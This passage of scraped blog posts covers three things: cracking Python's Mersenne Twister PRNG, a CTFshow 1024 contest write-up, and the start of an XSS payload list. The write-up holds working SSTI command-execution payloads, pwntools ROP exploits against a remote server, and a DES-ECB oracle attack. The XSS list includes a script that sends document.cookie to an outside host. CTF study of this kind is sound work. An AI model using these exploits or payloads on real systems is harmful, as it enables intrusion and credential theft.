state，变换完成之后再进行输出伪随机数，以此类推。 设新生成的 state 列表为 mt&#39;，而原来的 state 列表为 mt（注意在MT19937原代码中并没有赋值新的列表，只是不断地更新原来地列表） 在 twist() 函数中，每生成的新的一个 state 列表中的 mt&#39;[i]，只和在原来的 state 中的 mt[i+1] 以及 mt[i+397] 有关。 而当 i+1 或者 i+397 大于 624 时，也就是超过了一个 state 列表总长度时，那么 mt[i+1] 或者 mt[i+397] 实际上是 mt&#39;[(i+1) % 624] 或者 mt&#39;[(i+397) % 624]。 继续 extract_number() 函数 在判断执行 twist() 函数与否之后，从目前的 state 列表中单独抽取每个数进行运算，运算结果即是输出的随机数。也就是说，state 列表里的每个数都单独的进行与常量的位运算。 random模块getrandbits 函数在收到超出32比特的参数，会把已生成的state放在低位，高位放置新生成的state。 攻击求后随机数（逆 extract_number）假设已知624个从开始连续输出的随机数，需要预测之后每一个输出的随机数，只需要逆转输出的随机数组成 state列表，然后设置伪随机数发生器的 state 即可，然后输出需要预测的随机数。 Mersenne Twister Predictor https://github.com/kmyk/mersenne-twister-predictor 123456789import randomfrom mt19937predictor import MT19937Predictorpredictor = MT19937Predictor()for _ in range(624): x = random.getrandbits(32) predictor.setrandbits(x, 32)assert random.getrandbits(32) == predictor.getrandbits(32) Extend MT19937 Predictor https://github.com/NonupleBroken/ExtendMT19937Predictor 12345678910111213import randomfrom extend_mt19937_predictor import ExtendMT19937Predictorpredictor = ExtendMT19937Predictor()for _ in range(624): predictor.setrandbits(random.getrandbits(32), 32)for _ in range(1024): assert predictor.predict_getrandbits(32) == random.getrandbits(32) assert predictor.predict_getrandbits(64) == random.getrandbits(64) assert predictor.predict_getrandbits(128) == random.getrandbits(128) assert predictor.predict_getrandbits(256) == random.getrandbits(256) randcrack https://github.com/tna0y/Python-random-module-cracker 12345678910111213import random, timefrom randcrack import RandCrackrandom.seed(time.time())rc = RandCrack()for i in range(624): rc.submit(random.getrandbits(32)) # Could be filled with random.randint(0,4294967294) or random.randrange(0,4294967294)print(&quot;Random result: &#123;&#125;\\nCracker result: &#123;&#125;&quot; .format(random.randrange(0, 4294967295), rc.predict_randrange(0, 4294967295))) 原始 12345678910111213141516171819202122232425262728293031323334353637383940# 脚本1# right shift inversedef inverse_right(res, shift, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &gt;&gt; shift return tmp# right shift with mask inversedef inverse_right_mask(res, shift, mask, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &gt;&gt; shift &amp; mask return tmp# left shift inversedef inverse_left(res, shift, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &lt;&lt; shift return tmp# left shift with mask inversedef inverse_left_mask(res, shift, mask, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &lt;&lt; shift &amp; mask return tmpdef recover(y): y = inverse_right(y,18) y = inverse_left_mask(y,15,4022730752) y = inverse_left_mask(y,7,2636928640) y = inverse_right(y,11) return y&amp;0xffffffffrandom_number = []state = [recover(i) for i in random_number] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# 脚本2from random import Randomdef invert_right(m,l,val=&#x27;&#x27;): length = 32 mx = 0xffffffff if val == &#x27;&#x27;: val = mx i,res = 0,0 while i*l&lt;length: mask = (mx&lt;&lt;(length-l)&amp;mx)&gt;&gt;i*l tmp = m &amp; mask m = m^tmp&gt;&gt;l&amp;val res += tmp i += 1 return resdef invert_left(m,l,val): length = 32 mx = 0xffffffff i,res = 0,0 while i*l &lt; length: mask = (mx&gt;&gt;(length-l)&amp;mx)&lt;&lt;i*l tmp = m &amp; mask m ^= tmp&lt;&lt;l&amp;val res |= tmp i += 1 return resdef invert_temper(m): m = invert_right(m,18) m = invert_left(m,15,4022730752) m = invert_left(m,7,2636928640) m = invert_right(m,11) return mdef clone_mt(record): state = [invert_temper(i) for i in record] gen = Random() gen.setstate((3,tuple(state+[0]),None)) return genprng = []g = clone_mt(prng[:624])for i in range(700): g.getrandbits(32)key = g.getrandbits(32)print(key) 求前随机数（逆 twist()） Extend MT19937 Predictor https://github.com/NonupleBroken/ExtendMT19937Predictor 1234567891011121314import randomfrom extend_mt19937_predictor import ExtendMT19937Predictornumbers = [random.getrandbits(64) for _ in range(1024)]predictor = ExtendMT19937Predictor()for _ in range(78): predictor.setrandbits(random.getrandbits(256), 256)_ = [predictor.backtrack_getrandbits(256) for _ in range(78)]for x in numbers[::-1]: assert x == predictor.backtrack_getrandbits(64) 完整 state 假设已知该 state 中的 624 个整数，想要知道之前输出的随机数，需要逆转 twist() 得到上一个 state 或者更之前的 state。 12345678910111213141516171819202122232425262728def backtrace(cur): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(623,-1,-1): tmp = state[i]^state[(i+397)%624] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 # recover highest bit res = tmp&amp;high # recover other 31 bits,when i =0,it just use the method again it so beautiful!!!! tmp = state[i-1]^state[(i+396)%624] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res |= (tmp)&amp;low state[i] = res return state 部分 state 假设已知 1000 个从开始第 5 个输出的连续随机数，求前 4 个输出的随机数的大小（参考V&amp;N 2020 - backtrace）。 这 1000 个随机数可以分成两段（对应不同的 state 生成的随机数），也就是前 620 个数为第一个 state 生成的，后 380 个数为第二个 state 生成的，需要求第一个 state 生成的前四个随机数。 123456789101112131415161718192021222324def backtrace(cur): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(3,-1,-1): tmp = state[i+624]^state[i+397] # mt&#x27;[i] == mt [i+624] if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res = tmp&amp;high tmp = state[i-1+624]^state[i+396] if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res |= (tmp)&amp;low state[i] = res return state 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# 脚本from random import Random# right shift inversedef inverse_right(res,shift,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &gt;&gt; shift return tmp# right shift with mask inversedef inverse_right_values(res,shift,mask,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp&gt;&gt;shift &amp; mask return tmp# left shift inversedef inverse_left(res,shift,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &lt;&lt; shift return tmp# left shift with mask inversedef inverse_left_values(res,shift,mask,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &lt;&lt; shift &amp; mask return tmpdef backtrace(cur): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(5,-1,-1): tmp = state[i+624]^state[i+397] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 # recover highest bit res = tmp&amp;high # recover other 31 bits,when i =0,it just use the method again it so beautiful!!!! tmp = state[i-1+624]^state[i+396] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res |= (tmp)&amp;low state[i] = res return statedef recover_state(out): state = [] for i in out: i = inverse_right(i,18) i = inverse_left_values(i,15,0xefc60000) i = inverse_left_values(i,7,0x9d2c5680) i = inverse_right(i,11) state.append(i) return statec = []partS = recover_state(c)state = backtrace([0]*6+partS)[:624]# print(state)# state[0]不准确，因state[0]==seed，单推# inv = invert(1812433253,1&lt;&lt;32)# seed = inverse_right(((state[1]-1)*inv)%(1&lt;&lt;32),30)# state[0] = int(seed)prng = Random()prng.setstate((3,tuple(state+[0]),None))flag = &quot;flag&#123;&quot; + &#x27;&#x27;.join(str(prng.getrandbits(32)) for _ in range(4)) + &quot;&#125;&quot;print(flag) 求seed（逆 __init__）根据第一次的 state，逆向 seed。 123456789101112131415161718192021222324252627282930from gmpy2 import invertdef _int32(x): return int(0xFFFFFFFF &amp; x)def init(seed): mt = [0] * 624 mt[0] = seed for i in range(1, 624): mt[i] = _int32(1812433253 * (mt[i - 1] ^ mt[i - 1] &gt;&gt; 30) + i) return mtdef invert_right(res,shift): tmp = res for i in range(32//shift): res = tmp^res&gt;&gt;shift return _int32(res)def recover(last): n = 1&lt;&lt;32 inv = invert(1812433253,n) for i in range(623,0,-1): last = ((last-i)*inv)%n last = invert_right(last,30) return lastseed = 2080737669state = init(seed)print(recover(state[-1]) == seed) 参考 浅析MT19937伪随机数生成算法","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"流密码","slug":"流密码","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"CTFshow 1024杯","slug":"match-CTFshow-1024杯","date":"2020-10-25T09:29:24.000Z","updated":"2020-10-28T12:06:19.448Z","comments":true,"path":"2020/10/25/match-CTFshow-1024杯/","permalink":"https://lazzzaro.github.io/2020/10/25/match-CTFshow-1024%E6%9D%AF/","excerpt":"","text":"​ 比赛：CTFshow 1024杯平台：https://ctf.show开始：2020/10/23 18:00结束：2020/10/25 18:00题目： web 杂项 密码 逆向 pwn 各3道规则：1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：https://wp.ctf.show2 公平竞技，独立比赛3 服务器不要爆破，不要攻击服务器，不要扫描!!!4 奖品：武功秘籍一本，(100元以内) 出题：crypto1+re1 Web1024_WEB签到call_user_func()函数第1个参数为函数名，传入phpinfo 在Configuration中发现不起眼的自定义ctfshow项，内有自定义函数ctfshow_1024 support，传值得flag。 ​ 1024_fastapi页面回显一个JSON数据，了解一下fastapi。 FastAPI 是一个高性能 Web 框架，用于构建 API。 主要特性： 快速：非常高的性能，与 NodeJS 和 Go 相当 快速编码：将功能开发速度提高约 200％ 至 300％ 更少的错误：减少约 40％ 的人为错误 直观：强大的编辑器支持，自动补全无处不在，调试时间更少 简易：旨在易于使用和学习，减少阅读文档的时间。 简短：减少代码重复。 稳健：获取可用于生产环境的代码，具有自动交互式文档 基于标准：基于并完全兼容 API 的开放标准 OpenAPI 和 JSON Schema 发现其自带交互式API文档，访问/docs页，有采用POST方式传参的/cccalccc页，参数q传入计算式得到结果。 因为是python框架，尝试使用SSTI，反复测试各种输入，发现结果为list或string类型的都Internal Server Error或结果为空，尝试将string切片显示，发现成功： str([].__class__.__base__.__subclasses__()[25])[1:] 回显：&#123;&quot;res&quot;:&quot;class &#39;property&#39;&gt;&quot;,&quot;err&quot;:false&#125; 尝试查找warnings.catch_warnings所在下标，以进一步命令执行。爆破下标输出各元素： 1234567import requestsurl=&#x27;http://6aeaea7f-b079-4159-9ac8-d29a4b828174.chall.ctf.show/cccalccc&#x27;for i in range(500): data=&#123;&#x27;q&#x27;:&#x27;str([].__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;])[1:]&#x27;&#125; r=requests.post(url,data) print(r.text) 发现下标189为warnings.catch_warnings，尝试 [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;) 发现过滤了import和system关键字，&#39;import&#39;用&#39;__imp&#39;+&#39;ort__&#39;代替，system用popen代替， 列目录： [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls&#39;).read() 根目录无flag文件，单个目录查找flag关键字： [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;find /app | xargs grep flag&#39;).read() 查到结果： &quot;/app/main.py: hint = \\&quot;flag is in /mnt/f1a9,try to read it\\&quot;\\n/app/start.sh:source flag.sh\\n&quot;, 读取拿flag： [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;cat /mnt/f1a9&#39;).read() ​ Misc1024_签到 附件地址：https://ctfshow.lanzoui.com/iEuSDhlkxsj 包含很多行x y d text类型的数据，开始以为是Dijkstra算法求最短路径连成flag，跑脚本发现时间复杂度太高 暴力查找，从ag&#123;查找得到的结果，再顺着y值（$y_k$）找以y值开头的x值（$x_{k+1}=y_k$）的行，连接text得flag。 ​ 1024_重新签到 附件：Misc-2-.zip 类三层套娃。 level 1 文件尾提示It&#39;s all numbers，普通爆破无果 出题人提示CRC爆破，压缩包内文件为10字节数字，CRC=0x342F0E5C，10字节CRC爆破： 12345678910from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom binascii import crc32def brute_force(): return bruteforce(lambda x:crc32(x.encode())==int(&#x27;342F0E5C&#x27;,16),string.digits,length=10,method=&#x27;fixed&#x27;)print(brute_force()) 好在设置的数字不大，约1min得结果，为level 2密码。 level 2 jpg图片steghide隐写，解出txt文件，内容：密码是什么呀。 level 3 压缩包注释The password is 32 bits.，结合level 2解出的提示，各种可能的32位md5值都不行，经出题人反复提醒，才知道32是故意留的坑，真正的加密方式是sha（啥），尝试sha1加密什么呀解出flag。 ​ 1024_兔耳 附件地址:https://ctfshow.lanzoui.com/iO0PPhlly5i 带噪音的摩斯密码，而且还很长，不会用脚本去噪+识别，直接硬搞。 内容中必定含flag或FLAG关键字，找到..-. .-.. .- --.特征的一段，接着后面就是flag值。 ​ 1024_非常简单 附件：6.zip + jpg 6.zip 爆破6位数字密码+base92+base64+摩斯密码，得the end。 jpg 分离zip文件，txt中与佛论禅解密得一串数字，结合提示（低头思考/老人机打字）手机键盘解密得zip密码； 第二层zip，txt内容为密文，文件名提示（你怕蛇吗）为Serpent加密，用在线解密网站解密，密钥为6.zip得到的the end，解出为zip密码，打开得flag。 ​ 1024_1024zip套娃 附件：1024.zip 带密码的多层zip套娃，且密码为0124四种数字组成，只能用脚本，生成新的删除旧的。 12345678910111213141516171819202122232425262728import zipfile import osnow = &quot;1024.zip&quot;while 1: print(&quot;~~&quot;+now) zfile = zipfile.ZipFile(now) passFile=open(&#x27;dic.txt&#x27;) #先用0124全排列做字典 for line in passFile.readlines(): try: password = line.strip(&#x27;\\n&#x27;) zfile.extractall(members=zfile.namelist(), pwd=password.encode(&#x27;utf-8&#x27;)) zfile.close() try: os.remove(now) except OSError as e: print(e) names = os.listdir() print(names) for name in names: if name.endswith(&#x27;.zip&#x27;) and name != now: now=name break break except: pass print(&#x27;~~~~&#x27;+now) 解到最终的2048层flag.txt说去看1024层，好在脚本把中间的文件输出且未删除1024.txt文件， hex+hex+b64+b32+hex+b64+hex+b64+hex+b32+b32+hex+b64+zip，得到flag。 ​ 1024_调频收音机 附件地址：https://ctfshow.lanzoui.com/iPAJehln1zc audacity打开，切到频谱图，发现01波形，不会写脚本，把01字符串手撸下来， 尝试按字节分割无果，转成字符串得到包含569a四种字符的字符串，为曼彻斯特编码，脚本解码，得到标准曼彻斯特编码的解码结果为flag。 ​ 1024_大威天龙 送你一句箴言“大威天龙，世尊地藏，般若诸佛，般若巴嘛哄” 修改png高度，发现非文字版与佛论禅，找个在线网站OCR识别文字并检查修正， 修正后，与佛论禅+新与佛论禅+与熊论道+与佛论禅V2，得到flag。 ​ Crypto1024_TrickRSA向+一点数论推导技巧。 $e_1d \\equiv e_2(d+1024) \\equiv 1 \\pmod {\\varphi(n)}$ 即 $(e_1-e_2)d \\equiv 1024e_2 \\pmod {\\varphi(n)}$ 两边乘以 $e_1$ ，有 $(e_1-e_2)e_1d \\equiv 1024e_2e_1 \\pmod {\\varphi(n)}$ 因 $e_1d \\equiv 1 \\pmod {\\varphi(n)}$，则 $e_1-e_2 \\equiv 1024e_2e_1 \\pmod {\\varphi(n)}$ 即 $e_1-e_2-1024e_1e_2 \\equiv 0 \\pmod {\\varphi(n)}$ 即 $e_1-e_2-1024e_1e_2 = k\\varphi(n), k\\in \\mathbb{Z}$ $e_1,e_2$ 已知，可以计算出 $\\varphi(n)$ 的倍数值 $k\\varphi(n)$ 用 $k\\varphi(n)$ 可求出对应的 $d’$值：$e_1d’ \\equiv 1 \\pmod {k\\varphi(n)}$ 联立 $e_1d \\equiv 1 \\pmod {\\varphi(n)}$，有 $d=d’\\pmod {\\varphi(n)}$ 故 $m=c^{d’} \\pmod n$。 12345678910import gmpy2n=e1=e2=enc=kphi = (e1-e2)-1024*e2*e1dd = gmpy2.invert(e1, kphi)msg = pow(enc, dd, n)print(bytes.fromhex(hex(msg)[2:])) ​ 1024_麻辣兔头第七锅 小白兔，白又白，跳出栅栏进锅来 附件：tutu.txt 明显提示的栅栏密码，看到整个密文用普通和W型解都不对， 仔细看密文中只有一对&#123;和&#125;，且&#123;前30个字节内有f/l/a/g四种字母，且间隔相等， 截取f开头到&#125;结尾的字符串，尝试按6位一行取出并观察每行首字母，flag部分为0-f字符，调整第15行之后为5位一行，最后每行首字母连成flag。 ​ 1024_密码系统 1024密码系统，have fun！！！ DES-ECB模式攻击，参考：https://www.jianshu.com/p/8aef410a2eae 整体思路： 由脚本得知为8位分组的DES-ECB加密，每块8位明文单独加密得8位密文，又因key由两种字符串随机选择用于加密，每块8位明文对应的密文有两种可能。 结合脚本观察输出值，是密文 $c$ 经过 $c^{12}+rand(10^{1023},10^{1024})$ 处理的，假设 $c^{12}+rand(10^{1023},10^{1024}) \\lt(c+1)^{12}$ 那么对输出值直接开12次方取整即为 $c$。 明文由输入值m+flag+padding组成，$m$ 为空时， $c$ 可分 $k$ 块，不断调整 $m$ 的长度，直到 $m$ 长度为 $l+1$ 时 $c$ 可分 $k+1$ 块，那么说明 $m$ 长度为 $l$ 时 $c$ 刚好可分 $k$ 块，即无padding情况下，$m+flag$ 可分 $k$ 块，则flag长度即为 $8k-l$。 利用上面的思想，在 $m$ 长度为 $l$ 的基础上，长度不断加1，则可以把flag从后开始的每一位推到下一个块中，得到下一个块的密文 $c_i$； 又已爆破出的flag位+padding已知，则下一个块的构成为未知字符1位+已爆破出的flag位(+padding)； 根据DES-ECB的性质，相同明文块对应的密文块相同。爆破第一位未知字符，将上面的块构成作为输入值输入，得到对应的密文的第一块，分别与实际密文 $c_i$ 比较，匹配的即为正确的明文字符。 以此类推，得到完整flag。 123456789101112131415161718192021222324252627282930313233343536373839#DES-ECB模式运作测试脚本from Crypto.Cipher import DESfrom binascii import b2a_hex, a2b_hexfrom itertools import *import randomimport gmpy2def Encode_1024sys(data,key): data_list = [data[i:i+8] for i in range(0,len(data),8)] print(data_list) k1 = DES.new(key.encode(), DES.MODE_ECB) k2 = DES.new(key[::-1].encode(), DES.MODE_ECB) data_res = &#x27;&#x27; for i in range(0,len(data_list)): k = random.choice([k1,k2]) c = k.encrypt(data_list[i].encode()) data_res += b2a_hex(c).decode() print(b2a_hex(c).decode()) return data_resdef Encode_1024(data,key): len_data=len(data) choices = cycle(&#x27;1024&#x27;) while len_data%8!=0: data += next(choices) len_data=len(data) data_res = Encode_1024sys(data,key) print(data_res) print() data_out = hex(int(data_res,16)**12 + random.randint(10**1023,10**1024))[2:] return data_outmsg=&#x27;*&#x27;*19test_flag=&#x27;10120120414410412041101201204144104120&#x27;test_key=&#x27;messages&#x27;out=Encode_1024(msg+test_flag,test_key)print(out)print()print(hex(gmpy2.iroot(int(out,16),12)[0])) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#解题脚本from pwn import *import gmpy2import stringhost = &#x27;111.231.70.44&#x27;port = 28045block = 8secret_len = 38ori_padding_len = block-secret_len%blockdef getCliphertext(data): return hex(gmpy2.iroot(int(data,16),12)[0])[2:]p = connect(host,port)dic = &#x27;0124&#x27;padding = [&#x27;1024102&#x27;,&#x27;102410&#x27;,&#x27;10241&#x27;,&#x27;1024&#x27;,&#x27;102&#x27;,&#x27;10&#x27;,&#x27;1&#x27;,&#x27;&#x27;]flag = &#x27;&#x27;for i in range(secret_len): prob=[] find=0 payload = &#x27;*&#x27;*(ori_padding_len+i+1) group = i//block for j in range(20): p.recvuntil(&#x27;&gt; &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;msg: &#x27;) p.sendline(payload) p.recvuntil(&#x27;is : &#x27;) data = p.recvline() data = getCliphertext(data) print([data[i:i+16] for i in range(0,len(data),16)]) print(data) if group == 0: prob.append(data[-16:]) else: prob.append(data[-16*(group+1):-16*(group+1)+16]) prob=list(set(prob)) print(str(i+1)+&#x27; prob = &#x27;+str(prob)) for j in dic: p.recvuntil(&#x27;&gt; &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;msg: &#x27;) flag_suffix = flag[:min(len(flag),7)] payload = j + flag_suffix + padding[min(len(flag_suffix),7)] print(payload) p.sendline(payload) p.recvuntil(&#x27;is : &#x27;) data = p.recvline() data = getCliphertext(data) print(data[:16]) if data[:16] in prob: flag = j + flag print(str(i+1)+&#x27; flag = &#x27;+flag) print() find=1 break if find == 0: print(str(i+1)+&#x27; cannot find!&#x27;) break print(flag)#44414440122401244401404424404421440414 最后得到的flag串并不是真正的flag，提示为01248，即云影密码，按0分隔，其他数隔开后组合加和，转化为1-26对应的字母，得到最终flag。 ​ Reverse1024_抽象语言手逆python字节码。源码用python -m dis code.py生成。 字节码还原的相关分析参考： https://docs.python.org/zh-cn/3/library/dis.html https://bbs.pediy.com/thread-262577.htm 得到源码： 1234567891011121314151617181920212223242526272829import base64k = 0_ = 0c = b&quot;...&quot; #base64密文略c = base64.b64decode(c).decode().split(&quot;,&quot;)def x(n): if n &gt; 1: for i in range(2, n): if (n % i) == 0: return False break return True else: return Falsez = lambda n: (2 ** n) - 1out = &#x27;&#x27;while _ &lt; len(c): if x(z(k)): out += chr(int(c[_]) ^ z(k)) _ += 1 k += 1print(out.join([&#x27;flag&#123;&#x27;,&#x27;&#125;&#x27;])) c解出的list与满足函数x()条件的 $2^k-1$ 分别异或得到结果，而x()中判断 $2^k-1$ 是否为素数。 直接运行在短时间只能得到前几位的结果，是因为 $2^k-1$ 的值为指数级增长，而且x()中又需对每个数从2至当前数遍历，非常耗时。 换个角度，c的list长度为47，那么只需寻找前47个满足 $2^k-1$ 为素数的 $k$ 值即可。 参考：梅森素数 梅森数，是指形如 $2^p－1$ 的一类数，其中指数 $p$ 是正整数，常记为 $M_p$ 。如果梅森数是素数，就称为梅森素数。 用因式分解法可以证明，若 $2^n－1$ 是素数，则指数 $n$ 也是素数；反之，当 $n$ 是素数时，$2^n－1$（即$M_p$）却未必是素数。前几个较小的梅森数大都是素数，然而梅森数越大，梅森素数也就越难出现。 目前仅发现51个梅森素数，最大的是 $M_{82589933}$（即 $2^{82589933}-1$），有 $24862048$ 位。 可见满足梅森素数（$2^k-1$）的梅森指数（$k$ 值）必定也是素数，而寻找梅森素数的过程很复杂且极其耗时（发现第35-51个梅森素数的过程，使用巨型分布式算力都花费了近20年）。 对于著名数列，可以使用在线整数数列查询网站（OEIS）查询，梅森素数数列里不足47个，不过可以从梅森指数数列里取47个 $k$ 再计算 $2^k-1$。 12345678910111213141516import base64_ = 0c = b&quot;...&quot; #base64密文略c = base64.b64decode(c).decode().split(&quot;,&quot;)me = [2, 3, 5, 7, 13, 17, 19, 31, 61, 89, 107, 127, 521, 607, 1279, 2203, 2281, 3217, 4253, 4423, 9689, 9941, 11213, 19937, 21701, 23209, 44497, 86243, 110503, 132049, 216091, 756839, 859433, 1257787, 1398269, 2976221, 3021377, 6972593, 13466917, 20996011, 24036583, 25964951, 30402457, 32582657, 37156667, 42643801, 43112609]out = &#x27;&#x27;while _ &lt; len(c): out += chr(int(c[_]) ^ 2**me[_]-1) _ += 1print(out.join([&#x27;flag&#123;&#x27;,&#x27;&#125;&#x27;])) ​ Pwn1024_happy_stack happy为主，顺便签到 无system无/bin/sh无libc。 需要满足s==&#39;36D&#39;，padding填充&#39;36D&#39;.ljust(0x380,&#39;\\x00&#39;)， 可以通过puts函数泄露出puts函数地址，再到libc数据库查找下载相应的libc，用one_gadget找到execve()函数，根据偏移计算基地址，ROP成功。 1234567891011121314151617181920212223242526272829303132from pwn import *p=remote(&#x27;111.231.70.44&#x27;,28058)#p=process(&#x27;./pwn1&#x27;)elf = ELF(&#x27;./pwn1&#x27;)p.recvuntil(&#x27;qunzhu\\n&#x27;)p.recvline()puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]main_addr=elf.symbols[&#x27;main&#x27;]poprdi_addr=0x400803payload=&#x27;36D&#x27;.ljust(0x380,&#x27;\\x00&#x27;)+&#x27;a&#x27;*8+p64(poprdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload)print(p.recvline())p.recvline()puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(puts_addr))#one_gadget libc6_2.27-3ubuntu1_amd64.solibc=ELF(&#x27;./libc6_2.27-3ubuntu1_amd64.so&#x27;)libc_puts=libc.symbols[&#x27;puts&#x27;]libc_execve=libc.symbols[&#x27;execve&#x27;]libc_base=puts_addr-libc_putsexecve_addr=libc_base+0x10a38cpayload=&#x27;36D&#x27;.ljust(0x380,&#x27;\\x00&#x27;)+&#x27;a&#x27;*8+p64(execve_addr)p.sendline(payload)p.interactive() ​ 1024_happy_checkin无system无/bin/sh无libc。 可以通过puts函数泄露出puts函数地址，再到libc数据库查找下载相应的libc，用one_gadget找到execve()函数，根据偏移计算基地址，ROP成功。 123456789101112131415161718192021222324252627282930from pwn import *p=remote(&#x27;111.231.70.44&#x27;,28041)#p=process(&#x27;./pwn2&#x27;)elf = ELF(&#x27;./pwn2&#x27;)p.recvline()puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]main_addr=elf.symbols[&#x27;main&#x27;]poprdi_addr=0x4006e3poprsi_addr=0x4006e1payload=&#x27;a&#x27;*(0x370+8)+p64(poprdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload)puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(puts_addr))#one_gadget libc6_2.27-3ubuntu1_amd64.solibc=ELF(&#x27;./libc6_2.27-3ubuntu1_amd64.so&#x27;)libc_puts=libc.symbols[&#x27;puts&#x27;]libc_execve=libc.symbols[&#x27;execve&#x27;]libc_base=puts_addr-libc_putsexecve_addr=libc_base+0x10a38cpayload=&#x27;a&#x27;*(0x370+8)+p64(execve_addr)p.sendline(payload)p.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"XSS","slug":"web-XSS","date":"2020-10-21T11:47:25.000Z","updated":"2024-11-24T05:13:49.361Z","comments":true,"path":"2020/10/21/web-XSS/","permalink":"https://lazzzaro.github.io/2020/10/21/web-XSS/","excerpt":"","text":"​ 跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。 ​ 平台https://xss.pt/xss.php ​ 基本XSS123456789101112131415161718192021222324252627282930313233343536373839&lt;!-- Basic payload --&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&lt;scr&lt;script&gt;ipt&gt;alert(&#x27;XSS&#x27;)&lt;/scr&lt;script&gt;ipt&gt;&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;&lt;script&gt;fetch(&#x27;http://xxx?a=&#x27;+document.cookie)&lt;/script&gt;&lt;!-- Img payload --&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)//&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;&quot;&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;&quot;&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;&lt;!-- Svg payload --&gt;&lt;svgonload=alert(1)&gt;&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;&lt;svg onload=alert(1)//&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;&lt;svg id=alert(1) onload=eval(id)&gt;&quot;&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;&quot;&gt;&lt;svg/onload=alert(/XSS/)&lt;!-- HTML5中的一些XSS --&gt;&lt;body onload=alert(/XSS/.source)&gt;&lt;input autofocus onfocus=alert(1)&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;textarea/autofocus/onfocus=alert(1)&gt;&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video/poster/onerror=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;&lt;video src=_ 